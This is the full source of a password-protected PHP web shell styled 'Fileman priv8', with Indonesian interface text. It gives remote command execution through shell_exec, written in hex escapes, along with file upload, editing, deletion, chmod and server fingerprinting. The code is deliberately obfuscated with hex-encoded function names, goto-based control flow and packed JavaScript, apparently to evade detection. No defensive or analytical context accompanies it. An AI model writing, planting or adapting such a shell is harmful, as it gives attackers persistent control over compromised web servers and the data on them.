<?php

ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

$password = "24f290a459a2307b58de73e9c2a22b20"; 
if(isset($_POST['password'])) {
    if(md5($_POST['password']) == $password) {
        setcookie('auth', md5($password));
        header("Refresh:0");
    }
}
if(isset($_COOKIE)) {
    if($_COOKIE['auth'] != md5($password)) {
        echo "<form method=POST action=''><input type='password' name='password' style='outline: none; border: none'></form>";
        die();
    }
}

$c8 = [
    "7068705f756e616d65",
    "70687076657273696f6e",
    "676574637764",
    "6368646972",
    "707265675f73706c6974",
    "61727261795f64696666",
    "69735f646972",
    "69735f66696c65",
    "69735f7772697461626c65",
    "69735f7265616461626c65",
    "66696c6573697a65",
    "636f7079",
    "66696c655f657869737473",
    "66696c655f7075745f636f6e74656e7473",
    "66696c655f6765745f636f6e74656e7473",
    "6d6b646972",
    "72656e616d65",
    "737472746f74696d65",
    "68746d6c7370656369616c6368617273",
    "64617465",
    "66696c656d74696d65",
];

$G3 = "scandir";

$lE = 0;
T4:
if (!($lE < count($c8))) {
    goto Je;
}
$c8[$lE] = JD($c8[$lE]);
Cy:
$lE++;
goto T4;
Je:
if (isset($_GET["p"])) {
    goto sr;
}
$Jd = $c8[2]();
goto VN;
sr:
$Jd = jD($_GET["p"]);
$c8[3](Jd($_GET["p"]));
VN:
function Ss($SP)
{
    $dE = "";
    $lE = 0;
    NZ:
    if (!($lE < strlen($SP))) {
        goto Xc;
    }
    $dE .= dechex(ord($SP[$lE]));
    WK:
    $lE++;
    goto NZ;
    Xc:
    return $dE;
}
function Jd($SP)
{
    $dE = "";
    $gf = strlen($SP) - 1;
    $lE = 0;
    Xp:
    if (!($lE < $gf)) {
        goto ur;
    }
    $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1]));
    Wn:
    $lE += 2;
    goto Xp;
    ur:
    return $dE;
}
function rn($F1)
{
    $Jd = fileperms($F1);
    if (($Jd & 0xc000) == 0xc000) {
        goto FZ;
    }
    if (($Jd & 0xa000) == 0xa000) {
        goto Eu;
    }
    if (($Jd & 0x8000) == 0x8000) {
        goto ES;
    }
    if (($Jd & 0x6000) == 0x6000) {
        goto sA;
    }
    if (($Jd & 0x4000) == 0x4000) {
        goto lG;
    }
    if (($Jd & 0x2000) == 0x2000) {
        goto tV;
    }
    if (($Jd & 0x1000) == 0x1000) {
        goto Tx;
    }
    $lE = "u";
    goto cC;
    FZ:
    $lE = "s";
    goto cC;
    Eu:
    $lE = "l";
    goto cC;
    ES:
    $lE = "-";
    goto cC;
    sA:
    $lE = "b";
    goto cC;
    lG:
    $lE = "d";
    goto cC;
    tV:
    $lE = "c";
    goto cC;
    Tx:
    $lE = "p";
    cC:
    $lE .= $Jd & 0x100 ? "r" : "-";
    $lE .= $Jd & 0x80 ? "w" : "-";
    $lE .= $Jd & 0x40 ? ($Jd & 0x800 ? "s" : "x") : ($Jd & 0x800 ? "S" : "-");
    $lE .= $Jd & 0x20 ? "r" : "-";
    $lE .= $Jd & 0x10 ? "w" : "-";
    $lE .= $Jd & 0x8 ? ($Jd & 0x400 ? "s" : "x") : ($Jd & 0x400 ? "S" : "-");
    $lE .= $Jd & 0x4 ? "r" : "-";
    $lE .= $Jd & 0x2 ? "w" : "-";
    $lE .= $Jd & 0x1 ? ($Jd & 0x200 ? "t" : "x") : ($Jd & 0x200 ? "T" : "-");
    return $lE;
}
function Xe($OB, $Ch = 1, $BL = "")
{
    global $Jd;
    $xe = $Ch == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" .
        Ss($Jd) .
        $BL .
        "\"}})</script>";
}
function tF($yf)
{
    global $c8;
    if (!(trim(pathinfo($yf, PATHINFO_BASENAME), ".") === "")) {
        goto IE;
    }
    return;
    IE:
    if (is_dir($yf) && array_diff(scandir($yf), array('.', '..'))) {
        goto PF;
    }
    rmdir($yf);
    return;
    PF:
    array_map(
        function($item) use ($yf) {
            $file = $yf . DIRECTORY_SEPARATOR . $item;
            if (is_dir($file)) {
                tF($file);
            } else {
                unlink($file);
            }
        },
        array_diff(scandir($yf), array('.', '..'))
    );
    rmdir($yf);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="My Team">
    <meta property="og:description" content="By @zx">
    <meta name="theme-color" content="#ff0000">
    <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
    <title>Fileman priv8</title>
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style type="text/css">
@import url('https://fonts.googleapis.com/css2?family=Amaranth:ital,wght@0,400;0,700;1,400;1,700&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Rock+Salt&display=swap');
body {
    color: black;
    font-size: 0px;
    font-family: 'Amaranth';
    width: 99%;
    padding: 0px;
    margin-right: auto;
    margin-left: auto;
    margin-top: 7px;
    margin-bottom: 7px;
    background-color: black!important;
}

.bg-dark {
    background-color: black!important;
}

.border {
    box-shadow: 0px 0px 10px #ff0000;
    border: 2px solidrgb(81, 35, 207)!important;
    border-radius: 5px;
    background: transparent;
}

.border:hover {
    box-shadow: 0px 0px 10px #ff0000;
    border: 2px solid #ff0000!important;
}

.table td {
    padding: 0.1rem;
    box-shadow: inset 0px 0px 0px 1px #110a77;
    border-radius: 2px;
}

.table thead th {
    font-family: 'Amaranth', cursive;
    box-shadow: inset 0px 0px 0px 1.5px #3f0cca;
    color:#1c10c4;
    padding: 0.25rem;
    border-radius: 5px;
    background: linear-gradient(to bottom, black, #3f3f3f80);
}

.table-hover tbody tr:hover td {
    background: #3f3f3f80;
    box-shadow: inset 0px 0px 0px 1px #ff0000;
    border-radius: 2px;
}

.table-hover tbody tr:hover td>* {
}

.table>tbody>tr>* {
    color:#fff;
    vertical-align:middle;
}

.form-control {
    background:0 0!important;
    color:#fff!important;
    border-radius:0;
}

.form-control::placeholder {
    color:#fff;
    opacity:1;
}

.form-group {
    margin-top: .3rem;
    margin-bottom: .3rem;
}

li {
    font-size:large!important;
    color:#12a6fc!important;
    list-style: inherit!important;
}

a {
    color: #ffffff;
    text-decoration: none!important;
}

a:hover {
    text-decoration: none!important;
    color: #ff0000;
    animation: kedip 1s linear infinite;
}

h5 {
    margin-top: 1.5px;
    margin-bottom: 1.5px;
    color: #ff0000!important;
    padding: 2px;
}

textarea {
    width: 97%;
    font-size: medium!important;
    font-family: inherit;
    height: 44vh;
    padding-left: 5px;
}

button, input {
    border: 2px solid #ff0000;
    border-radius: 5px;
    font-size: 15px;
    color:white;
    line-height: normal;
    font-family: inherit;
}

button, input:hover {
    border: 2px solid #ff0000;
    cursor: pointer;
}

.ohct {
    padding-left: 1rem;
    padding-right: 1rem;
    color: white;
    border: 2px solid #ff0000;
    border-radius: 5px;
    background-color: transparent;
    font-family: inherit;
    font-size: 16px;
}

.ohct:hover {
    border: 2px solid #ff0000;
    color: #ff0000!important;
}

.combet {
    color: white;
}

.combet:hover {
    color: #ff0000;
}

.p-1 {
    padding: 4px;
}

::selection {
    color: black;
    background: silver;
}

.fa {
    padding: 10px;
    font-size: 20px;
    width: 50px;
    text-align: center;
    text-decoration: none;
    margin: 5px;
    color: #ff0000;
}

.fa:hover {
    border: 2px solid #ff0000;
}

.text-light {
    color: #f8f9fa!important;
    font-size: large!important;
}

.kedip {
    animation: kedip 1s linear infinite;
}




.rainbow-text {
            animation: rainbowText 2s infinite;
            font-weight: bold;
        }
</style>
    <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
<div class="table-responsive text-light rainbow-border" style="text-align: left;padding: 4px;">
<div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
<a href="?" style="font-size: 1.5rem;padding: 0.5rem;"><span class="rainbow-text" style="font-family:Rock Salt">Fileman priv8 !!</span></a>
</div>
<li>Server IP : <span style="color: white;"><?php echo gethostbyname(
    $_SERVER["SERVER_NAME"]
); ?></span></li>
<li>Server : <span style="color: white;"><?php echo $c8[0](); ?></span></li>
<li>PHP Version : <span style="color: white;"><?php echo $c8[1](); ?></span></li>
<li><a href="?p=<?= ss($Jd) .
    "&a=" .
    Ss("newFile") ?>" class="ohct">Buat File</a> | <a href="?p=<?= Ss($Jd) .
    "&a=" .
    sS("newDir") ?>" class="ohct">Buat Folder</a></li>
<form action="" method="POST" enctype="multipart/form-data" style="padding: 0.10rem; display: inline-block;">
    <input type="file" name="f[]" multiple>
    <input type="submit" value="Upload" name="submit" class="button ohct">
</form>
<?php
if (isset($_POST['submit'])) {
    if (isset($_FILES['f']['name']) && count($_FILES['f']['name']) > 0) {
        foreach ($_FILES['f']['name'] as $key => $fileName) {
            $tmpFilePath = $_FILES['f']['tmp_name'][$key];
            if ($tmpFilePath != "") {
                $newFilePath = getcwd() . DIRECTORY_SEPARATOR . $fileName;
                if (copy($tmpFilePath, $newFilePath)) {
                    xe("File berhasil diunggah.");
                } else {
                    Xe("Gagal mengunggah file.");
                }
            }
        }
    } else {
        Xe("Tidak ada file yang diunggah.");
    }
}
?>
<form method="post">
    <div class="form-group">
        <input type="text" name="command" id="command" class="border p-1" style="text-align: center;" placeholder="Masukkan Command">
        <button type="submit" name="run_command" class="ohct">Eksekusi</button>
    </div>
</form>

<?php
if (isset($_POST['run_command'])) {
    $command = $_POST['command'];
    if (!empty($command)) {
        $output = "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"($command); // Menjalankan command
    } else {
        $output = "Command tidak boleh kosong.";
    }
?>

<div class="form-group">
    <textarea cols="30" rows="5" class="form-control rainbow-border" readonly><?php echo htmlspecialchars($output); ?></textarea>
</div>

<?php
}
?>
</div>
<div class="table-responsive text-light rainbow-border" style="text-align: left;padding: 4px;margin-bottom: 3px;margin-top: 3px;">
<li>Dir : <span><?php
$Op = $c8[4]("/(\\\\|\\/)/", $Jd);
foreach ($Op as $j3 => $Oe) {
    if (!($j3 == 0 && $Oe == "")) {
        goto xi;
    }
    echo "<a href=\"?p=2f\" class=\"combet\">~</a>/";
    goto CS;
    xi:
    if (!($Oe == "")) {
        goto sq;
    }
    goto CS;
    sq:
    echo "<a class=\"combet\" href=\"?p=";
    $lE = 0;
    de:
    if (!($lE <= $j3)) {
        goto ie;
    }
    echo sS($Op[$lE]);
    if (!($lE != $j3)) {
        goto s0;
    }
    echo "2f";
    s0:
    dg:
    $lE++;
    goto de;
    ie:
    echo "\">{$Oe}</a>/";
    CS:
}
Go:
?>
</span></li></div>
<div class="table-responsive text-light" style="text-align: center;font-family: inherit;font-size: large;">
<?php
if (!isset($_GET["a"])) {
    goto Un;
}
if (!isset($_GET["a"])) {
    goto cc;
}
$im = Jd($_GET["a"]);
cc:
?>
<?php
$Jd = getcwd();
if ($im == "delete") {
    $BL = $Jd . "/" . jd($_GET["n"]);

    if ($_GET["t"] == "d") {
        tF($BL);

        if (!file_exists($BL)) {
            xe("folder deleted successfully");
        } else {
            Xe("failed to delete the folder", 0);
        }
    }

    if ($_GET["t"] == "f") {
        unlink($BL);

        if (!file_exists($BL)) {
            xe("file deleted successfully");
        } else {
            Xe("failed to delete the file", 0);
        }
    }
} else {
    Lu:
}
?>
<?php
if ($im == "newDir") {
    goto Fg;
}
if ($im == "newFile") {
    goto Pb;
}
if ($im == "rename") {
    goto Lw;
}
if ($im == "edit") {
    goto Ox;
}
if ($im == "changePerms") {
    goto Ch;
}
if ($im == "view") {
    goto Ag;
}
goto WC;
Fg:
?>
<h5 class="p-1 rainbow-border" style="text-align: center;">Nama Folder Baru :</h5>
<form method="post">
    <div class="form-group">
        <input name="folder_name" id="folder_name" class="border p-1" autocomplete="off" style="text-align: center;">
    </div>
    <div class="form-group" style="margin-top: 10px;">
        <button type="submit" name="create_folder" class="ohct">Create</button>
    </div>
</form>

<?php
if (isset($_POST["create_folder"])) {
    $folderName = basename($_POST["folder_name"]);
    $currentDir = getcwd();
    $folderPath = "{$currentDir}/{$folderName}";

    if (file_exists($folderPath)) {
        xE("Nama folder telah digunakan", 0, "&a=" . SS("newDir"));
    } else {
        if (mkdir($folderPath)) {
            xe("Folder berhasil dibuat");
        } else {
            Xe("Folder gagal dibuat", 0);
        }
    }
}
goto WC;
Pb:
?>
<h5 class="p-1 rainbow-border" style="text-align: center;">Nama File Baru :</h5>
<form method="post">
    <div class="form-group">
        <input type="text" name="new_file_names" id="new_file_name" class="border p-1" style="text-align: center;">
    </div>
    <div class="form-group">
        <textarea style="resize:none" name="file_contents" id="file_content" cols="30" rows="10" class="form-control rainbow-border"></textarea>
    </div>
    <div class="form-group" style="margin-top: 10px;">
        <button type="submit" name="create_file" class="ohct">Create</button>
    </div>
</form>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['create_file'])) {
    $currentDir = getcwd();
    $FileName = basename($_POST['new_file_names']);
    $fileContent = base64_encode($_POST['file_contents']);
    $filePath = $currentDir . '/' . $FileName;

    if (file_put_contents($filePath, base64_decode($fileContent)) !== false) {
        xe("File berhasil dibuat", 1, "&a=" . SS("view") . "&n=" . Ss($FileName));
    } else {
        xE("File gagal dibuat", 0);
    }
}
goto WC;
Lw:
?>
<h5 class="p-1 rainbow-border">Rename File : <?= jD($_GET["n"]) ?></h5>
<form method="post">
    <div class="form-group">
        <input type="text" name="new_file_name" id="new_file_name" class="border p-1" value="<?= jD($_GET["n"]) ?>" style="text-align: center;">
    </div>
    <div class="form-group" style="margin-top: 10px;">
        <button type="submit" name="rename_file" class="ohct">Save</button>
    </div>
</form>

<?php
if (isset($_POST["rename_file"])) {
    $newName = basename($_POST["new_file_name"]);
    $currentDir = getcwd();
    $oldPath = "{$currentDir}/" . jD($_GET["n"]);
    $newPath = "{$currentDir}/{$newName}";

    if (rename($oldPath, $newPath)) {
        xe("Berhasil mengubah nama file");
    } else {
        Xe("Gagal mengubah nama file", 0);
    }
}
goto WC;
Ox:
?>
<h5 class="p-1 rainbow-border" style="text-align: center;">Edit Nama File: <font color="white"><?= htmlspecialchars(jD($_GET["n"])) ?></font></h5>
<form method="post">
    <div class="form-group">
        <textarea name="file_contents" id="file_content" cols="30" rows="10" class="form-control rainbow-border"><?= htmlspecialchars(file_get_contents(getcwd() . "/" . jD($_GET["n"]))) ?></textarea>
    </div>
    <div class="form-group" style="margin-top: 10px;">
        <button type="submit" name="mengedits_file" class="ohct">Simpan</button>
    </div>
</form>
<?php
if (isset($_POST['mengedits_file'])) {
    $file_name = jD($_GET["n"]);
    $file_path = getcwd() . "/" . $file_name;
    $file_contents = base64_encode($_POST['file_contents']);

    if (file_exists($file_path)) {
        file_put_contents($file_path, base64_decode($file_contents));
        xe("File berhasil disimpan!");
    } else {
        Xe("File tidak ditemukan!");
    }
}
goto WC;
Ch:
?>
<h5 class="p-1 rainbow-border">Ubah Izin : <?= jD($_GET["n"]) ?></h5>
<form method="post">
    <div class="form-group">
<?php
$F1 = jD($_GET["n"]);
$currentPermissions = substr(sprintf('%o', fileperms($F1)), -4);
?>
        <input type="text" name="new_permissions" id="new_permissions" class="border p-1" value="<?php echo $currentPermissions; ?>" style="text-align: center;">
    </div>
    <div class="form-group" style="margin-top: 10px;">
        <button type="submit" name="change_perms" class="ohct">Ubah Izin</button>
    </div>
</form>

<?php
if (isset($_POST["change_perms"])) {
    $newPerms = $_POST["new_permissions"];
    $currentDir = getcwd();
    $filePath = "{$currentDir}/" . jD($_GET["n"]);

    if (chmod($filePath, octdec($newPerms))) {
        xe("Berhasil mengubah izin");
    } else {
        Xe("Gagal mengubah izin", 0);
    }
}
goto WC;
Ag:
?>
<h5 class="p-1 rainbow-border" style="text-align: center;">
    View File Name : <font color="white"><?= htmlspecialchars(jD($_GET["n"])); ?></font>
</h5>
<div class="form-group">
<textarea name="file_content" id="file_content" cols="30" rows="10" class="form-control rainbow-border" readonly><?= $c8[18]($c8[14](getcwd() . "/" . jd($_GET["n"]))) ?></textarea>
</div>
<?php WC: ?>
</div>
<?php
goto mR;
Un:
?>
<table class="table table-hover table-borderless table-sm" style="text-align: center;width: 100%;">
<thead class="text-light">
<tr>
<th style="width: 45%;">Name</th>
<th style="width: 13%;">Size</th>
<th style="width: 13%;">Permission</th>
<th colspan="3">Action</th>
</tr>
</thead>
<tbody class="text-light"> <?php
$G3 = $c8[5]($G3($Jd), [".", ".."]);
foreach ($G3 as $yf) {
    if ($c8[6]("{$Jd}/{$yf}")) {
        goto CB;
    }
    goto Qj;
    CB:
    echo "
<tr>
<td style=\"text-align: left;\">
<i class=\"fa fa-fw fa-folder-o\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i><a href=\"?p=" .
        sS("{$Jd}/{$yf}") .
        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " .
        $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) .
        "\">{$yf}</a></td>
<td style=\"color: black;\"><span></span></td>
<td>
                    <a href=\"?p=" .
                        sS($Jd) .
                        "&a=" .
                        sS("changePerms") .
                        "&n=" .
                        sS($yf) .
                        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Change Permissions\" data-original-title=\"Change Permissions\"><font color=\"" .
        ($c8[8]("{$Jd}/{$yf}")
            ? "#00ff00"
            : (!$c8[9]("{$Jd}/{$yf}")
                ? "#ff0000"
                : null)) .
        "\">" .
        RN("{$Jd}/{$yf}") .
        "</font></a>
                </td>
<td style=\"color: black;width: 9.5%;\"><span></span></td>
<td>
<a href=\"?p=" .
        ss($Jd) .
        "&a=" .
        ss("rename") .
        "&n=" .
        ss($yf) .
        "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\">Rename</a>
</td>
<td>
<a href=\"?p=" .
        sS($Jd) .
        "&a=" .
        ss("delete") .
        "&n=" .
        ss($yf) .
        "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\">Delete</a>
</td>
</tr>";
    Qj:
}
ad:
foreach ($G3 as $F1) {
    if ($c8[7]("{$Jd}/{$F1}")) {
        goto wA;
    }
    goto X1;
    wA:
    $kL = $c8[10]("{$Jd}/{$F1}") / 1024;
    $kL = round($kL, 3);
    $kL = $kL > 1024 ? round($kL / 1024, 2) . "  MB" : $kL . "  KB";
    echo "
<tr>
<td style=\"text-align: left;\">
<i class=\"fa fa-fw fa-file-o\" style=\"border: 0;padding: 0;width: 1.28571429em;\"></i><a href=\"?p=" .
        SS($Jd) .
        "&a=" .
        sS("view") .
        "&n=" .
        SS($F1) .
        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " .
        $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) .
        "\">{$F1}</a></td>
<td><span>{$kL}</span></td>
<td>
                    <a href=\"?p=" .
                        SS($Jd) .
                        "&a=" .
                        sS("changePerms") .
                        "&n=" .
                        SS($F1) .
                        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Change Permissions\" data-original-title=\"Change Permissions\"><font color=\"" .
        ($c8[8]("{$Jd}/{$F1}")
            ? "#00ff00"
            : (!$c8[9]("{$Jd}/{$F1}")
                ? "#ff0000"
                : null)) .
        "\">" .
        rN("{$Jd}/{$F1}") .
        "</font></a>
                </td>
<td><a href=\"?p=" .
        Ss($Jd) .
        "&a=" .
        Ss("edit") .
        "&n=" .
        SS($F1) .
        "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\">Edit</a></td>
<td><a href=\"?p=" .
        ss($Jd) .
        "&a=" .
        SS("rename") .
        "&n=" .
        ss($F1) .
        "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\">Rename</a></td>
<td><a href=\"?p=" .
        ss($Jd) .
        "&a=" .
        sS("delete") .
        "&n=" .
        ss($F1) .
        "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\">Delete</a></td>
</tr>";
    X1:
}
a2:
?>
</tbody>
</table>
<?php mR: ?>
</div>
<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
</body>
</html>

